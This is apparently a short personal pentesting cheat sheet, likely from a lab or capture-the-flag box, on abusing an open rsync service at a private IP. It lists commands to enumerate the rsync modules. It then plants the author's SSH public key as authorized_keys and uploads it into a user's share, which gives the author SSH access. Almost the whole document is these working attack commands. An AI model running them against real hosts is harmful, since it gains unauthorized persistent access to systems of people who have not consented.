#linux #enumerations 

#### Viewing files

```bash
rsync -av --protect-args 'rsync://192.168.220.126:873/'
```

then pick a folder

```bash
rsync -av --protect-args 'rsync://192.168.220.126:873/fox/'
```

### Upload File(.ssh)

```bash
mkdir .ssh 
```

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCFhFRSqewzmooax5glwkwTl6wA3gRYyKRZMQ98axKxYYQiXhtIddN4BJPz7mPC53ARxTOqNqQOX1bcTy1yDmKLS3lccyX26rmPAwPO7l3kqHqL8RKPmsuuXqE6W51sctIsUKIpP2tTeE68J5Ap5doqxERZloA2P+NdF1+yU4Kv9mjiIKjH8bXnR56eqzJMiBzF0OxDhS0ZkwAMegm5Za8x3uQpe0OCL/zaPz3KCcnAHoThyXtFsBAnSqyr5jrfq458KsqCOhxk4NOs8HbEDKuWHqax1dcQ+2q+4GoEVlpNU33XJkGDispZmAtxmqFwJm+36JMmDtIIAxl+25D5lSz7TkeJ4I/QKVFosV8wnghDIXwBBEhajk8ZwqcpHf7B+ZPNSz652Hna9IMSgxZXfYXRRXd388Wq/2wOwrcLNTvWV3WY5B8Fv1LrtW1qt9DfxpgssPaUjyj5Eqp0boYKv402LFnC0zWw2/joN+9eu5/kP+NRvVwHsyp+tN6I9Oc+Fs= kali@kali" > .ssh/authorized_keys
```

```bash
rsync -av --protect-args ./.ssh 'rsync://192.168.220.126:873/fox' 
```


